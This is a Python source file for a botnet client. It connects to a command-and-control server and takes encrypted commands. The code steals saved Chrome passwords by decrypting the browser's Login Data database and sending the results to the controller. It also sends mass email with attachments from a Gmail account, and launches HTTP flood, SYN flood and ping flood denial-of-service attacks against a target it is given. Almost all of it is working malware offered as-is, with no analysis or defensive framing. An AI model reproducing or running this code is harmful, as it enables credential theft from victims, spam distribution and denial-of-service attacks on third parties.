import socket, threading
import time
import smtplib, email
import os, sqlite3, win32crypt
import requests

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from cryptography.fernet import Fernet

from scapy.all import *

def CLreciever(leng, client):    # function that returns client recieve
    data = ''.encode()
    while int(leng) > 1024:
        d = client.recv(1024)
        leng = int(leng) - 1024
        data += d
    d = client.recv(1024)
    data += d
    return data

class Botnet:
    def __init__(self):
        self.encryptingKey = b''
        self.key = Fernet.generate_key()
        self.encryptor = Fernet(self.key)
        self.currentAttack = None
        self.stopAttbool = False
    def connection(self):
        while True:
            try:
                time.sleep(1)
                self.encryptingKey = b''
                self.stopAttbool = True
                self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.client.connect(("127.0.0.1", 36983))
                while("-----BEGIN PUBLIC KEY-----" not in self.encryptingKey.decode()):
                        self.encryptingKey = self.client.recv(10200)    # Get Asymmetric key
                print(self.encryptingKey)
                RSAencryptor = PKCS1_OAEP.new(RSA.import_key(self.encryptingKey))
                self.client.send(RSAencryptor.encrypt(self.key))    # Send symmetric key
                while True:
                    cmd = self.client.recv(1024)
                    print(cmd)
                    cmd = self.encryptor.decrypt(cmd).decode()
                    print(cmd)

                    if cmd.split(" ")[0] == "%$mailSpam":

                        file = ""
                        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
                        msg = email.message.EmailMessage()

                        leng = cmd.split("$filelength: ")[1].split(" $filename:")[0]
                        if int(leng) > 0:
                            file = CLreciever(leng, self.client)

                        threading.Thread(target=self.mail_mass, args=[cmd, leng, file]).start()

                    elif cmd.split(" ")[0] == "%$chromePass":
                        self.chrome_pass()

                    elif cmd.split(" ")[0] == "%$Att":
                        self.stopAttbool = False
                        self.currentAttack = threading.Thread(target=self.attack, args=[cmd])
                        self.currentAttack.start()

                    elif cmd.split(" ")[0] == "%$StopAtt":
                        try:
                            self.stopAttbool = True
                        except:
                            pass
            except Exception as e:
                print(e)

    def mail_mass(self, cmd, leng, file):
        try:
            User = cmd.split(" ")[2]
            Pass = cmd.split(" ")[4]

            mails = []

            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            msg = email.message.EmailMessage()

            msg['Subject'] = cmd.split("$subject: ")[1].split(" $filelength: ")[0]
            msg['From'] = User
            msg.set_content(cmd.split("$text: ")[-1])

            if int(leng) > 0:
                msg.add_attachment(file, maintype='application', subtype='octet-stream', filename=cmd.split("$filename: ")[1].split(" $text:")[0])

            server.login(User, Pass)
            for i in range(6, cmd.split(" ").index("$subject:") - 1):
                print("a")
                msg['To'] = cmd.split()[i]
                server.send_message(msg)
                print("Sent")
            server.quit()
        except Exception as e:
             print(e)


    def chrome_pass(self):
        usrpass = ""
        try:
            data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
            c = sqlite3.connect(data_path)
            cursor = c.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            login_data = cursor.fetchall()
            for url, user_name, pwd in login_data:
                pwd = win32crypt.CryptUnprotectData(pwd)[1].decode()
                if (pwd and user_name != ""):
                    usrpass = usrpass + url + " " + user_name + " " + pwd + "\n"
            self.client.send(self.encryptor.encrypt(usrpass.encode()))
        except:
            self.client.send(self.encryptor.encrypt("Error!".encode()))
            pass

    def attack(self, cmd):
        try:
            url = cmd.split(" ")[-1]
            attackType = cmd.split(" ")[-2]
        except:
            pass

        if attackType == "$DDoS":
            while self.stopAttbool is not True:
                threading.Thread(target=self.distributed_denial_of_service_attack, args=[url]).start()
        elif attackType == "$SynFlooding":
            self.syn_flooding(url, 80)
        elif attackType == "$PingFlooding":
            self.ping_flooding(url)

    def distributed_denial_of_service_attack(self, url):
        try:
            print(requests.get(url))
        except:
            pass

    def syn_flooding(self, target, port):
        try:
            ip = IP(dst=target)
        except:
            ip = IP(dst=socket.gethostbyname(target.split("https://")[-1].split("http://")[-1].split("https:/")[-1].split("http:/")[-1]))

        tcp = TCP(sport=RandShort(), dport=port, flags="S")
        raw = Raw(b"X" * 1024)

        packet = ip / tcp / raw
        while self.stopAttbool is not True:
            send(packet)

    def ping_flooding(self, target):
        try:
            ip = IP(dst=target)
        except:
            ip = IP(dst=socket.gethostbyname(target.split("https://")[-1].split("http://")[-1].split("https:/")[-1].split("http:/")[-1]))
        tcp = ICMP(type=8)
        raw = Raw(b"X" * 1024)

        packet = ip / tcp / raw
        while self.stopAttbool is not True:
            send(packet)

bot = Botnet()
bot.connection()
